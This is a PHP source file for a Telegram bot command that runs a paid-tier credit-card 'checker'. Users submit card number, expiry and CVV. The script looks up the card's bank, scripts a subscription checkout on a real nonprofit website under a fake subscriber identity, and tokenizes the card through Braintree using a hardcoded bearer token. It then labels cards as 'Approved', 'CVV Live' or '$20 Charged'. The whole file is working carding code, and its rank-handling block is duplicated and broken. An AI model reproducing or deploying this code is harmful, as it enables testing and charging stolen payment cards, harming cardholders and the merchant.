<?php
//=========RANK DETERMINE=========//
$currentDate = date('Y-m-d');
$rank = "FREE";
$expiryDate = "0";

$paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
$freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
$owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

if (in_array($userId, $owners)) {
    $rank = "OWNER";
    $expiryDate = "UNTIL DEAD";
} else {
    foreach ($paidUsers as $index => $line) {
        list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
        if ($userIdFromFile == $userId) {
            if ($userExpiryDate < $currentDate) {
                unset($paidUsers[$index]); //
                file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                $freeUsers[] = $userId; // add to free users list
                file_put_contents('Database/free.txt', implode("\n", $freeUsers));
            } else    $currentDate = date('Y-m-d');
            $rank = "FREE";
            $expiryDate = "0";

            $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
            $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
            $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

            if (in_array($userId, $owners)) {
                $rank = "OWNER";
                $expiryDate = "UNTIL DEAD";
            } else {
                foreach ($paidUsers as $index => $line) {
                    list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
                    if ($userIdFromFile == $userId) {
                        if ($userExpiryDate < $currentDate) {
                            unset($paidUsers[$index]);
                            file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                            $freeUsers[] = $userId;
                            file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                        } else {
                            $rank = "PAID";
                            $expiryDate = $userExpiryDate;
                        }
                    }
                }
            } {
                $rank = "PAID";
                $expiryDate = $userExpiryDate;
            }
        }
    }
}

//=======RANK DETERMINE END=========//
$update = json_decode(file_get_contents("php://input"), TRUE);
$text = $update["message"]["text"];
//========WHO CAN CHECK FUNC========//
$r = "0";

$r = rand(0, 100);
//=====WHO CAN CHECK FUNC END======//
if (preg_match('/^(\/bf|\.bf|!bf)/', $text)) {
    $userid = $update['message']['from']['id'];

    if (!checkAccess($userid)) {
        $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> @$username You're not Premium user❌</b>", $message_id);
        exit();
    }
    $start_time = microtime(true);

    $chatId = $update["message"]["chat"]["id"];
    $message_id = $update["message"]["message_id"];
    $keyboard = "";
    $message = substr($message, 4);
    $messageidtoedit1 = bot('sendmessage', [
        'chat_id' => $chat_id,
        'text' => "<b>LOADING PLEASE WAIT ☺️</b>",
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id
    ]);
    $messageidtoedit = Getstr(json_encode($messageidtoedit1), '"message_id":', ',');

    $cc = multiexplode(array(":", "/", " ", "|"), $message)[0];
    $mes = multiexplode(array(":", "/", " ", "|"), $message)[1];
    $ano = multiexplode(array(":", "/", " ", "|"), $message)[2];
    $cvv = multiexplode(array(":", "/", " ", "|"), $message)[3];
    $amt = '1';
    if (empty($cc) || empty($cvv) || empty($mes) || empty($ano)) {
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoedit,
            'text' => "Invalid details \nFormat -> cc|mm|yy|cvv",
            'parse_mode' => 'html',
            'disable_web_page_preview' => 'true'
        ]);
        return;
    };
    if (strlen($ano) == '4') {
        $an = substr($ano, 2);
    } else {
        $an = $ano;
    }
    $amount = $amt * 100;
    //------------Card info------------//
    $lista = '' . $cc . '|' . $mes . '|' . $an . '|' . $cvv . '';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/' . $cc . '');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: lookup.binlist.net',
        'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
    ));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '');
    $fim = curl_exec($ch);
    $bank = GetStr($fim, '"bank":{"name":"', '"');
    $name = GetStr($fim, '"name":"', '"');
    $brand = GetStr($fim, '"brand":"', '"');
    $country = GetStr($fim, '"country":{"name":"', '"');
    $emoji = GetStr($fim, '"emoji":"', '"');
    $scheme = GetStr($fim, '"scheme":"', '"');
    $type = GetStr($fim, '"type":"', '"');
    if (strpos($fim, '"type":"credit"') !== false) {
        $bin = 'Fail';
    } else {
        $bin = 'Fail Try again';
    };
    //IF BIN ARE NOT AVAILABLE ----//
    if (empty($scheme)) {
        $scheme = "N/A";
    }
    if (empty($type)) {
        $type = "N/A";
    }
    if (empty($brand)) {
        $brand = "N/A";
    }
    if (empty($bank)) {
        $bank = "N/A";
    }
    if (empty($name)) {
        $name = "N/A";
    }
    if (empty($emoji)) {
        $emoji = "N/A";
    }
    if (empty($currency)) {
        $currency = "N/A";
    }

    //------------Card info------------//

    # -------------------- [1 REQ] -------------------#

    $proxie = null;
    $pass = null;
    $cookieFile = getcwd() . '/cookies.txt';

    function getstr2($string, $start, $end)
    {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://americanchordata.org/checkout/subscribe');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: es-ES,es;q=0.9',
        'Cache-Control: max-age=0',
        'Connection: keep-alive',
        'Referer: https://web.telegram.org/',
        'Sec-Fetch-Dest: document',
        'Sec-Fetch-Mode: navigate',
        'Sec-Fetch-Site: cross-site',
        'Sec-Fetch-User: ?1',
        'Upgrade-Insecure-Requests: 1',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',

    ]);
    curl_setopt($ch, CURLOPT_PROXY, $proxie);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);

    $r1 = curl_exec($ch);
    curl_close($ch);

    $cr = getstr($r1, "name='csrfmiddlewaretoken' value='", "' />");


    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://americanchordata.org/checkout/subscribe');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: es-ES,es;q=0.9',
        'Cache-Control: max-age=0',
        'Connection: keep-alive',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://americanchordata.org',
        'Referer: https://americanchordata.org/checkout/subscribe',
        'Sec-Fetch-Dest: document',
        'Sec-Fetch-Mode: navigate',
        'Sec-Fetch-Site: same-origin',
        'Sec-Fetch-User: ?1',
        'Upgrade-Insecure-Requests: 1',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    ]);
    curl_setopt($ch, CURLOPT_PROXY, $proxie);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'subscription_type=one-year&recurring_subscription=on&subscriber-first=jhin&subscriber-last=vega&subscriber-organization=&subscriber-email=josewers20%40gmail.com&subscriber-address1=street+212&subscriber-address2=&subscriber-city=new+york&subscriber-state=New+York&subscriber-zipcode=10080&subscriber-country=US&discount-code=&csrfmiddlewaretoken=' . $cr . '');

    $r2 = curl_exec($ch);
    curl_close($ch);


    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://americanchordata.org/checkout/address_confirm/c06251d7-72ff-4626-9d81-1b5e6b0fd005');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: es-ES,es;q=0.9',
        'Cache-Control: max-age=0',
        'Connection: keep-alive',
        'Referer: https://americanchordata.org/checkout/subscribe',
        'Sec-Fetch-Dest: document',
        'Sec-Fetch-Mode: navigate',
        'Sec-Fetch-Site: same-origin',
        'Sec-Fetch-User: ?1',
        'Upgrade-Insecure-Requests: 1',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',

    ]);
    curl_setopt($ch, CURLOPT_PROXY, $proxie);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);

    $r3 = curl_exec($ch);
    curl_close($ch);



    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://americanchordata.org/checkout/confirm/46ed6589-c5ea-4437-ba48-d6b73f7b4170');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: es-ES,es;q=0.9',
        'Cache-Control: max-age=0',
        'Connection: keep-alive',
        'Referer: https://americanchordata.org/checkout/confirm/46ed6589-c5ea-4437-ba48-d6b73f7b4170',
        'Sec-Fetch-Dest: document',
        'Sec-Fetch-Mode: navigate',
        'Sec-Fetch-Site: same-origin',
        'Sec-Fetch-User: ?1',
        'Upgrade-Insecure-Requests: 1',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    ]);
    curl_setopt($ch, CURLOPT_PROXY, $proxie);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);

    $r4 = curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: */*',
        'Accept-Language: es-ES,es;q=0.9',
        'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTg5NDk5MDMsImp0aSI6ImEwZjliYWU2LTJkOGQtNDk0ZS04YmYyLTc1ODIwYzAyN2FiNCIsInN1YiI6InZ0M3ozcWRuNzlxemh4a3IiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InZ0M3ozcWRuNzlxemh4a3IiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.n8F7zxuldfnKu2TINHyJVRJJ8g21CHVTxO6kED_C8Nblu7Mu5bQtYg6I-jqRdpLhWsM3YbK3rqFpNYe7EtH_kg',
        'Braintree-Version: 2017-12-15',
        'Connection: keep-alive',
        'Content-Type: application/json',
        'Origin: https://assets.braintreegateway.com',
        'Referer: https://assets.braintreegateway.com/',
        'Sec-Fetch-Dest: empty',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Site: cross-site',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    ]);
    curl_setopt($ch, CURLOPT_PROXY, $proxie);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       brand       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"' . $cc . '","expirationMonth":"' . $mes . '","expirationYear":"' . $ano . '","cvv":"' . $cvv . '","cardholderName":"jhin vega","billingAddress":{"postalCode":"10080"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');

    $r5 = curl_exec($ch);
    curl_close($ch);

    $j = json_decode($r5, true);
    $token = $j['data']['tokenizeCreditCard']['token'];


    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://americanchordata.org/checkout/confirm/46ed6589-c5ea-4437-ba48-d6b73f7b4170');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: es-ES,es;q=0.9',
        'Cache-Control: max-age=0',
        'Connection: keep-alive',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://americanchordata.org',
        'Referer: https://americanchordata.org/checkout/confirm/46ed6589-c5ea-4437-ba48-d6b73f7b4170',
        'Sec-Fetch-Dest: document',
        'Sec-Fetch-Mode: navigate',
        'Sec-Fetch-Site: same-origin',
        'Sec-Fetch-User: ?1',
        'Upgrade-Insecure-Requests: 1',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',

    ]);
    curl_setopt($ch, CURLOPT_PROXY, $proxie);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_nonce=' . $token . '&csrfmiddlewaretoken=' . $cr . '');
    $rf = curl_exec($ch);
    curl_close($ch);


    $msg = preg_match('/<div class="alert alert-danger fade in">.*?>(.*?)<\/div>/s', $rf, $matches) ? strip_tags($matches[1]) : "No Error";


    echo "message: $msg";

    if (strpos($rf, 'Card Issuer Declined CVV')) {
        $es = '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅';
        $repo = 'Card Issuer Declined CVV';
    } elseif (empty($msg)) {
        $es = '𝟮𝟬$ 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ✅';
      $repo = '20$ Payment Sucessful!';
    } elseif (strpos($rf, 'Gateway Rejected: avs_and_cvv')) {
        $es  = '𝗔𝘃𝘀 & 𝗖𝘃𝘃 𝗟𝗶𝘃𝗲 ✅';
        $repo = 'Gateway Rejected AVS & CVV';
    } elseif (strpos($rf, 'Gateway Rejected: avs')) {
        $es  = '𝗔𝘃𝘀 𝗟𝗶𝘃𝗲 ✅';
        $repo = 'Gateway Rejected Avs';
    } else {
        $es = '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌';
        $repo = 'Youre Card Declined!';
    }

    echo "<br>$es--$msg";


    $end_time = microtime(true);
    $time = number_format($end_time - $start_time, 2);
    ////////--[Responses]--////////


    bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $messageidtoedit,
        'text' => "$es
        
[×] 𝗖𝗖 ➔ <code>$lista</code>
[×] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➔ <code>Braintree Avs</code>
[×] 𝗥𝗲𝗽𝗼𝘀𝗲 ➔ <code>$msg</code>

[×] 𝗕𝗶𝗻 𝗜𝗻𝗳𝗼 ➔ <code>$brand - $scheme</code>
[×] 𝗕𝗮𝗻𝗸 ➔ <code>$bank</code>
[×] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➔ <code>$name $emoji</code>

[×] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ➔ <code>$time Seconds</code>
[×] 𝗥𝗲𝗾 𝗕𝘆 ➔ @$username [ <code>$rank</code> ]
",
        'parse_mode' => 'html',
        'disable_web_page_preview' => 'true'
    ]);
}
